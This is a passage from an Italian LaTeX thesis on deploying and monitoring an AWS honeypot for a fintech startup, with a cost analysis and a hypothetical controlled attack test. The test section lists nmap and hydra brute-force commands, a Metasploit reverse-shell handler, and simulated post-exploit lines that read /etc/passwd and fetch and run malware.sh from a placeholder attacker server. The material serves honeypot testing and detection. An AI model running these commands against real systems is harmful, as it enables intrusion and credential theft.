aws ec2 authorize-security-group-ingress --group-id sg-xxxxxxxx --protocol tcp --port 443 --cidr 0.0.0.0/0
# ... aggiungere altre porte in base all'honeypot scelto (es. 23, 69, 135, 445, 1433, 3306, 5060, 5900, 6379, 8080, etc.)

# Lancio istanza EC2 (usare un'AMI Linux recente)
aws ec2 run-instances --image-id ami-xxxxxxxx --count 1 --instance-type t2.micro --key-name your-key-pair --security-group-ids sg-xxxxxxxx --subnet-id subnet-xxxxxxxx --associate-public-ip-address --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=HoneypotServer}]' --user-data file://honeypot-setup.sh
\end{lstlisting}

Lo script `honeypot-setup.sh` potrebbe installare un software honeypot come T-Pot (seguendo guide come \cite{zhang_2023}) o Cowrie (\cite{cowrie_aws, infosanity_2020}).

\begin{lstlisting}[caption={Script di esempio `honeypot-setup.sh` per installare T-Pot (semplificato)}, label=lst:tpot_setup]
#!/bin/bash
apt-get update -y
apt-get install -y git docker.io # Prerequisiti T-Pot
systemctl enable docker
systemctl start docker

# Clonazione e installazione T-Pot (consultare la guida ufficiale per i dettagli!)
# git clone https://github.com/telekom-security/tpotce.git /opt/tpot
# cd /opt/tpot/iso/installer/
# ./install.sh --type=user # Scegliere il tipo appropriato

# Esempio: Installazione agente CloudWatch Logs per inviare log T-Pot
apt-get install -y python3-pip
pip3 install awscli awslogs
# ... configurare /etc/awslogs/awslogs.conf per leggere i log da /data/tpot/log/* ...
# systemctl enable awslogsd
# systemctl start awslogsd
echo "Honeypot setup script finished."
\end{lstlisting}

\subsubsection{Configurazione del Sistema di Monitoraggio (CloudWatch, GuardDuty)}
\label{subsubsec:config_monitoraggio}

Implementiamo un sistema di monitoraggio robusto utilizzando servizi AWS nativi.

\begin{lstlisting}[caption={Configurazione (esemplificativa) del monitoraggio AWS}, label=lst:monitoring_setup]
# Creazione del gruppo di log CloudWatch per i log dell'honeypot
aws logs create-log-group --log-group-name /honeypot/logs --region eu-west-1

# Creazione del detector di GuardDuty
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES --region eu-west-1

# Creazione di un topic SNS per le notifiche di allarmi/findings
aws sns create-topic --name HoneypotAlerts --region eu-west-1
# Sottoscrizione email/lambda per ricevere notifiche
aws sns subscribe --topic-arn arn:aws:sns:eu-west-1:ACCOUNT_ID:HoneypotAlerts --protocol email --notification-endpoint security@your-fintech.com --region eu-west-1

# Configurazione di un allarme CloudWatch (esempio: alto traffico in ingresso sull'honeypot)
aws cloudwatch put-metric-alarm --alarm-name HoneypotHighNetworkInAlarm \
    --metric-name NetworkIn --namespace AWS/EC2 \
    --statistic Average --period 300 --threshold 1000000 \
    --comparison-operator GreaterThanOrEqualToThreshold \
    --dimensions Name=InstanceId,Value=i-xxxxxxxxxxxxxxxxx \
    --evaluation-periods 1 --unit Bytes \
    --alarm-actions arn:aws:sns:eu-west-1:ACCOUNT_ID:HoneypotAlerts \
    --region eu-west-1

# Creare regole EventBridge per inoltrare i findings di GuardDuty al topic SNS
# ... configurazione tramite console o AWS CLI ...
\end{lstlisting}

\subsubsection{Simulazione di Servizi Finanziari (opzionale, per alta interazione)}
\label{subsubsec:sim_servizi}

Per rendere l'honeypot più attraente per attaccanti mirati al settore fintech, si potrebbero configurare servizi specifici (es. usando container Docker all'interno dell'honeypot) che simulano API di pagamento, portali fittizi, etc. Questo richiede un honeypot ad alta interazione e maggiore configurazione.

\subsubsection{Configurazione di AWS WAF e Shield (opzionale)}
\label{subsubsec:config_waf}

Sebbene l'obiettivo sia attirare traffico, si potrebbe considerare l'uso di AWS WAF (Web Application Firewall) davanti a eventuali servizi web esposti dall'honeypot (se gestito tramite un Load Balancer) non per bloccare, ma per *registrare* tipi specifici di attacchi (SQLi, XSS) o per filtrare traffico di gestione legittimo. AWS Shield Standard è attivo di default per proteggere da attacchi DDoS di base.

\subsection{Configurazioni di Sicurezza Aggiuntive}
\label{subsec:sicurezza_aggiuntiva}

È cruciale isolare l'honeypot per evitare che diventi un punto di partenza per attacchi verso l'infrastruttura reale:

\begin{itemize}
    \item \textbf{Network ACLs (NACLs)}: Configurare NACLs restrittive sulla subnet dell'honeypot per bloccare esplicitamente qualsiasi tentativo di comunicazione dall'honeypot verso le subnet di produzione.
    \item \textbf{Security Groups}: Il Security Group dell'honeypot dovrebbe permettere solo il traffico in ingresso necessario per i servizi esposti e limitare il traffico in uscita solo verso destinazioni note (es. endpoint CloudWatch Logs, server di aggiornamento).
    \item \textbf{IAM Roles}: Usare ruoli IAM con permessi minimi per l'istanza EC2 (es. solo per inviare log a CloudWatch).
    \item \textbf{Monitoraggio delle Configurazioni (AWS Config)}: Monitorare cambiamenti alla configurazione dell'honeypot (Security Groups, NACLs, etc.) per rilevare eventuali manomissioni.
    \item \textbf{Backup e Ripristino}: Avere un piano per ripristinare rapidamente l'honeypot da un'immagine pulita (AMI) nel caso venga compromesso in modo irrecuperabile.
\end{itemize}

\section{Analisi dei Costi per una Startup fintech}
\label{sec:analisi_costi}

\subsection{Stima dei Costi di Implementazione e Mantenimento}
\label{subsec:stima_costi}

I costi dipendono fortemente dalla complessità dell'honeypot e dal traffico ricevuto. Una stima indicativa mensile per un setup base su AWS (regione eu-west-1, Irlanda) potrebbe includere:


    

A questi costi diretti AWS, vanno aggiunti:

\begin{itemize}
    \item \textbf{Costi di personale}: Tempo dedicato all'analisi dei log e alla manutenzione. Anche poche ore a settimana possono incidere significativamente per una startup. L'analisi dei dati raccolti, come quelli mostrati in \cite{peiris_2024}, richiede tempo.
    \item \textbf{Costi iniziali di implementazione}: Setup e configurazione (potrebbero essere necessarie alcune giornate uomo).
    \item \textbf{Costi di formazione}: Se il team non ha esperienza con honeypot o analisi di sicurezza.
\end{itemize}

*Nota:* L'uso di istanze più potenti (es. t2.medium per T-Pot), più storage, o un traffico di attacco molto elevato possono aumentare i costi. Soluzioni specifiche come quelle su AWS Marketplace \cite{aws_marketplace} o integrazioni gestite \cite{rapid7, salient_2025} avranno modelli di costo differenti.

\subsection{Valutazione Costo-Beneficio per una Startup fintech}
\label{subsec:costo_beneficio}

Per una startup fintech, l'investimento in un honeypot deve essere valutato rispetto ai potenziali benefici:

\textbf{Fattori a favore dell'implementazione:}
\begin{itemize}
    \item \textbf{Riduzione del rischio finanziario e reputazionale}: Il costo di una violazione dei dati nel settore finanziario può essere estremamente elevato, potenzialmente esistenziale per una startup. Il costo dell'honeypot è generalmente trascurabile in confronto.
    \item \textbf{Vantaggio competitivo}: Dimostrare un approccio maturo e proattivo alla sicurezza può aumentare la fiducia di clienti, partner e investitori.
    \item \textbf{Supporto alla conformità normativa}: Può contribuire a soddisfare alcuni requisiti relativi al monitoraggio delle minacce e alla gestione degli incidenti.
    \item \textbf{Intelligence specifica}: Fornisce dati preziosi sulle TTP degli attaccanti che prendono di mira specificamente i servizi fintech, permettendo di adattare meglio le difese reali.
\end{itemize}

\textbf{Considerazioni economiche per una startup:}
\begin{itemize}
    \item \textbf{Budget limitato}: Il costo operativo, specialmente quello legato al tempo del personale per l'analisi, deve essere considerato attentamente.
    \item \textbf{Scalabilità}: L'approccio AWS permette di iniziare con un setup a basso costo e scalare se necessario.
    \item \textbf{Alternative}: Valutare se altre misure di sicurezza (es. WAF avanzato, test di penetrazione regolari) potrebbero offrire un ROI migliore nella fase iniziale.
\end{itemize}

\textbf{Conclusione sulla valutazione costo-beneficio:}
Per la maggior parte delle startup fintech, data la sensibilità dei dati gestiti e l'attrattiva per gli attaccanti, l'implementazione di un honeypot (anche semplice) rappresenta probabilmente un investimento giustificato. Il rapporto costo-beneficio è favorevole se l'honeypot contribuisce a prevenire anche un singolo incidente minore o fornisce intelligence utile a rafforzare le difese primarie. Si consiglia di iniziare con un'implementazione a basso costo e bassa interazione, focalizzandosi sull'integrazione con i sistemi di alerting esistenti.

\section{Test di Verifica: Esperimento di Attacco Controllato}
\label{sec:test_verifica}

\subsection{Progettazione dell'Esperimento}
\label{subsec:progettazione_test}

Per verificare l'efficacia dell'honeypot implementato, è stato condotto un esperimento controllato simulando diverse tipologie di attacco comunemente utilizzate contro infrastrutture web e servizi esposti.

\subsubsection{Obiettivi del Test}
\label{subsubsec:obiettivi_test}
\begin{itemize}
    \item Verificare la capacità dell'honeypot (ipotizziamo un T-Pot o simile) di rilevare e loggare correttamente varie tipologie di attacco.
    \item Testare l'efficacia del sistema di monitoraggio (CloudWatch Alarms, GuardDuty Findings) e di alerting (SNS).
    \item Valutare la qualità e l'utilità dei dati raccolti (IP sorgente, payload, comandi tentati).
    \item Identificare eventuali configurazioni errate o limitazioni del setup.
\end{itemize}

\subsubsection{Metodologia}
\label{subsubsec:metodologia_test}
Il test è stato condotto da un indirizzo IP esterno controllato, utilizzando strumenti di scansione e attacco standard, simulando un aggressore esterno non mirato ma opportunistico.
\begin{enumerate}
    \item Scansione delle porte e identificazione dei servizi esposti dall'honeypot.
    \item Tentativi di accesso (brute force) su servizi comuni (SSH, Telnet, web login fittizi).
    \item Tentativi di exploit su vulnerabilità note simulate dai servizi dell'honeypot (es. web server, database).
    \item Interazione con shell simulate (se disponibili, es. tramite Cowrie all'interno di T-Pot).
\end{enumerate}

\subsection{Software e Comandi Utilizzati (Esempi)}
\label{subsec:sw_comandi_test}

\subsubsection{Fase 1: Scansione e Ricognizione}
\label{subsubsec:fase1_test}
\begin{lstlisting}[caption={Comandi Nmap per la scansione iniziale}, label=lst:nmap_scan]
# Scansione TCP SYN delle porte comuni e version detection
nmap -sS -sV -p 21,22,23,80,443,3306,8080 <honeypot-public-ip>

# Scansione UDP
# nmap -sU --top-ports 20 <honeypot-public-ip>

# Scansione aggressiva (OS detection, script)
# nmap -A -T4 <honeypot-public-ip>
\end{lstlisting}

\subsubsection{Fase 2: Tentativi di Brute Force}
\label{subsubsec:fase2_test}
\begin{lstlisting}[caption={Attacchi di forza bruta con Hydra}, label=lst:hydra_brute]
# Brute force SSH
hydra -L users.txt -P passwords.txt ssh://<honeypot-public-ip> -t 4

# Brute force Telnet
hydra -L users.txt -P passwords.txt telnet://<honeypot-public-ip>

# Brute force su form di login web (esempio)
# hydra -l admin -P common-passwords.txt <honeypot-public-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
\end{lstlisting}

\subsubsection{Fase 3: Tentativi di Exploit (Simulati)}
\label{subsubsec:fase3_test}
Se l'honeypot emula servizi vulnerabili (es. tramite Kippo, Dionaea dentro T-Pot), si possono usare strumenti come Metasploit per interagire.
\begin{lstlisting}[caption={Esempio di interazione con Metasploit (ipotetico)}, label=lst:metasploit_test]
# msfconsole
# > use exploit/multi/handler # O exploit specifici se l'honeypot li simula
# > set PAYLOAD linux/x86/meterpreter/reverse_tcp
# > set LHOST <attacker-ip>
# > set RHOST <honeypot-public-ip>
# > exploit
\end{lstlisting}
L'honeypot dovrebbe loggare questi tentativi.

\subsubsection{Fase 4: Interazione Post-Exploit (Simulata)}
\label{subsubsec:fase4_test}
Se si ottiene accesso a una shell simulata (es. Cowrie \cite{cowrie_devs_2024}), l'honeypot registrerà i comandi eseguiti.
\begin{lstlisting}[caption={Comandi comuni eseguiti in shell compromesse simulate}, label=lst:post_exploit_cmds]
uname -a
ls -la /
cat /etc/passwd
wget http://<attacker-server>/malware.sh -O /tmp/m.sh
chmod +x /tmp/m.sh
/tmp/m.sh
exit
\end{lstlisting}

\subsection{Risultati Ottenuti (Ipotetici)}
\label{subsec:risultati_test}

L'esperimento simulato dovrebbe generare i seguenti output nel sistema di monitoraggio:

\subsubsection{Log dell'Honeypot (es. T-Pot / CloudWatch Logs)}
\label{subsubsec:log_honeypot_test}
\begin{itemize}
    \item Log dettagliati delle connessioni in ingresso (IP sorgente, porta destinazione, timestamp).
    \item Credenziali usate nei tentativi di brute force (log di Cowrie, HonSSH).
    \item Payload di exploit tentati (log di Dionaea, Suricata).
    \item Comandi eseguiti nelle shell simulate (log di Cowrie).
    \item File scaricati dall'attaccante simulato (se supportato).
\end{itemize}

\subsubsection{Findings di AWS GuardDuty}
\label{subsubsec:guardduty_findings_test}
GuardDuty dovrebbe generare findings relativi a:
\begin{itemize}
    \item `Recon:EC2/Portscan`: Rilevamento della scansione Nmap.
    \item `UnauthorizedAccess:EC2/SSHBruteForce`: Rilevamento del brute force SSH.
    \item `UnauthorizedAccess:EC2/MaliciousIPCaller`: Se l'IP attaccante è noto per attività malevole.
    \item Potenzialmente altri findings a seconda delle azioni e delle capacità di GuardDuty.
\end{itemize}

\subsubsection{Allarmi AWS CloudWatch}
\label{subsubsec:cloudwatch_alarms_test}
\begin{itemize}
    \item L'allarme sull'alto traffico di rete (`NetworkIn`) dovrebbe scattare durante la scansione o il brute force.
    \item Altri allarmi configurati (es. alto utilizzo CPU) potrebbero attivarsi.
\end{itemize}

\subsubsection{Notifiche SNS}
\label{subsubsec:sns_notifications_test}
Le notifiche email (o altre configurate) dovrebbero essere ricevute in base ai trigger degli allarmi CloudWatch e/o ai findings di GuardDuty inoltrati tramite EventBridge.

\subsection{Analisi dei Risultati (Ipotetica)}
\label{subsec:analisi_risultati_test}

L'esperimento controllato dimostrerebbe (ipoteticamente) che:
\begin{itemize}
    \item L'honeypot rileva e registra correttamente le attività di scansione e brute force.
    \item I servizi AWS (GuardDuty, CloudWatch) forniscono un livello aggiuntivo di rilevamento e alerting automatico.
    \item I log raccolti (specialmente da honeypot come Cowrie/T-Pot) forniscono intelligence utile (credenziali tentate, comandi eseguiti).
    \item Il sistema di notifica funziona come previsto, allertando il team di sicurezza.
    \item L'uso di honeytokens \cite{10183431} potrebbe ulteriormente arricchire i dati raccolti, ad esempio se venissero utilizzate credenziali fittizie piazzate nell'honeypot.
\end{itemize}
Questo conferma il valore dell'honeypot come strumento di rilevamento e raccolta intelligence nell'ambiente AWS della startup fintech.

\section{Considerazioni Finali e Raccomandazioni}
\label{sec:considerazioni_finali}

\subsection{Sintesi dei Risultati}
\label{subsec:sintesi_risultati}

L'implementazione di un honeypot in un'infrastruttura AWS rappresenta una strategia di sicurezza proattiva valida ed economicamente accessibile per una startup fintech. Offre capacità di:
\begin{itemize}
    \item Rilevamento precoce di scansioni e tentativi di intrusione.
    \item Raccolta di intelligence specifica sugli attaccanti interessati ai servizi offerti.
    \item Distrazione degli attaccanti dai sistemi di produzione reali.
    \item Integrazione con strumenti di monitoraggio e alerting AWS nativi.
\end{itemize}
I test controllati confermano l'efficacia del rilevamento e del logging per le tipologie di attacco più comuni.

\subsection{Raccomandazioni per l'Implementazione}
\label{subsec:raccomandazioni}

Sulla base dell'analisi effettuata, si raccomanda alle startup fintech di:

\begin{itemize}
    \item \textbf{Iniziare in modo semplice}: Implementare un honeypot a bassa/media interazione (es. T-Pot, Cowrie) in un VPC isolato, con un focus sull'integrazione dell'alerting (GuardDuty, CloudWatch).
    \item \textbf{Isolare rigorosamente}: Utilizzare NACLs e Security Groups per impedire qualsiasi comunicazione dall'honeypot verso l'infrastruttura di produzione.
    \item \textbf{Automatizzare il monitoraggio}: Sfruttare al massimo CloudWatch Logs, GuardDuty e SNS/EventBridge per ridurre il carico di lavoro manuale di analisi.
    \item \textbf{Non fare affidamento esclusivo}: L'honeypot è uno strumento complementare, non sostitutivo, di altre misure di sicurezza fondamentali (WAF, IDS/IPS sulla rete di produzione, hardening, patch management, autenticazione forte, etc.).
    \item \textbf{Considerare la legalità e l'etica}: Essere consapevoli delle implicazioni legali relative alla raccolta di dati sugli attaccanti.
    \item \textbf{Pianificare la manutenzione}: Aggiornare regolarmente il software dell'honeypot e rivedere le configurazioni di sicurezza.
\end{itemize}

\subsection{Sviluppi Futuri}
\label{subsec:sviluppi_futuri}

L'implementazione di honeypot nel contesto fintech può evolvere:

\begin{itemize}
    \item \textbf{Honeypot più sofisticati}: Creare honeypot ad alta interazione che simulino più realisticamente le API e i workflow fintech specifici dell'azienda.
    \item \textbf{Honeytokens mirati}: Disseminare credenziali API fittizie, token di accesso o dati di clienti simulati all'interno dell'honeypot (o anche nei sistemi di produzione) per rilevare compromissioni più profonde \cite{10183431}.
    \item \textbf{Analisi basata su ML/AI}: Utilizzare servizi AWS (es. SageMaker, GuardDuty ML) o strumenti esterni per analizzare i pattern di attacco raccolti e identificare anomalie o minacce emergenti.
    \item \textbf{Condivisione dell'intelligence}: Contribuire (in modo anonimizzato, se possibile) ai dati raccolti alle piattaforme di threat intelligence per migliorare la sicurezza della comunità.
    \item \textbf{Integrazione con SOAR}: Automatizzare le risposte agli alert generati dall'honeypot (es. blocco IP a livello di WAF/NACL) tramite piattaforme SOAR (Security Orchestration, Automation and Response).
\end{itemize}

In conclusione, l'honeypot AWS rappresenta un investimento strategico e tecnicamente fattibile per una startup fintech, migliorando la visibilità sulle minacce e rafforzando la postura di sicurezza complessiva a fronte di un costo gestibile, specialmente se confrontato con i potenziali danni di un incidente di sicurezza.
% \chapter{Fondamenti di Sicurezza su AWS}
% \section{Modello di responsabilità condivisa di AWS}
% \section{Best practice di sicurezza specifiche per startup fintech}
% \section{Panoramica dei principali servizi di sicurezza di AWS}
% \subsection{AWS Identity and Access Management (IAM)}
% \subsection{AWS Key Management Service (KMS)}
% \subsection{AWS CloudTrail e Amazon CloudWatch (servizi concorrenti)}
% \subsection{AWS GuardDuty, Amazon Inspector e Amazon Macie (alternativa valida)}
% \subsection{Altri servizi rilevanti (es. AWS WAF, VPC)}

% \chapter{Gestione delle Identità e degli Accessi (IAM)}
% \section{Implementazione del principio del minimo privilegio}
% \section{Creazione e gestione di utenti, gruppi e ruoli IAM}
% \section{Utilizzo di policy IAM per concedere permessi granulari}
% \section{Configurazione dell'autenticazione a più fattori (MFA)}
% \section{Gestione delle credenziali (es. utilizzo di IAM Roles per EC2)}
% \section{Audit e monitoraggio degli accessi IAM}

% \chapter{Monitoraggio e Logging della Sicurezza}
% \section{Configurazione di AWS CloudTrail per tracciare le attività degli utenti}
% \section{Implementazione di Amazon CloudWatch per monitorare le metriche di sistema}
% \section{Creazione di allarmi per eventi specifici e attività sospette}
% \section{Utilizzo di AWS GuardDuty per il rilevamento automatico di minacce}
% \section{Integrazione con sistemi SIEM (Security Information and Event Management)}
% \section{Gestione e analisi dei log}

% \chapter{Protezione dei Dati Sensibili e Conformità Normativa}
% \section{Crittografia dei dati a riposo e in transito}
% \section{Gestione delle chiavi di crittografia con AWS KMS o CloudHSM}
% \section{Implementazione di meccanismi per la protezione dei dati in S3}
% \section{Misure per la conformità a PCI DSS (se rilevante)}
% \section{Misure per la conformità al GDPR e protezione dei dati personali}
% \section{Valutazione e gestione del rischio di perdita di dati}

% \chapter{Casi Studio e Implementazione Pratica}
% \section{Esempio di architettura di sicurezza AWS per una startup fintech (proposta)}
% \section{Implementazione delle best practice descritte nei capitoli precedenti}
% \section{Test di penetrazione e valutazione della sicurezza dell'ambiente}
% \section{Analisi dei risultati e confronto con le best practice}
% \section{Integrazione di strumenti di sicurezza terzi (es. SentinelOne)}
% \section{Infrastruttura di base AWS, integrazione codice e infrastruttura di un sistema honeypot}
% \section{Deadcode per confondere malware (Capitolo 7)}
% \section{Autenticazione con chiavi pubbliche (Capitolo 8)}
% \section{Progettazione e implementazione di una Virtual Private Cloud (VPC) isolata}
% \subsection{Creazione di subnet pubbliche e private}
% \subsection{Utilizzo di gruppi di sicurezza e ACL per controllare il traffico di rete}
% \subsection{Implementazione di Network Address Translation (NAT) e VPN/Direct Connect}
% \subsection{Configurazione di load balancer per alta disponibilità e scalabilità}
% \subsection{Utilizzo di container (es. ECS o EKS) per una maggiore sicurezza e scalabilità}

% \chapter{Discussione e Conclusioni}
% \section{Rielaborazione delle domande di ricerca iniziali e discussione dei risultati}
% \section{Riflessioni sulle sfide e opportunità per la sicurezza di AWS nelle startup fintech}
% \section{Prospettive future per la ricerca e l'innovazione}
% \section{Raccomandazioni per la creazione di un modello di cybersecurity resiliente per startup fintech}


%
%			BIBLIOGRAFIA
\printbibliography
% 
\end{document}
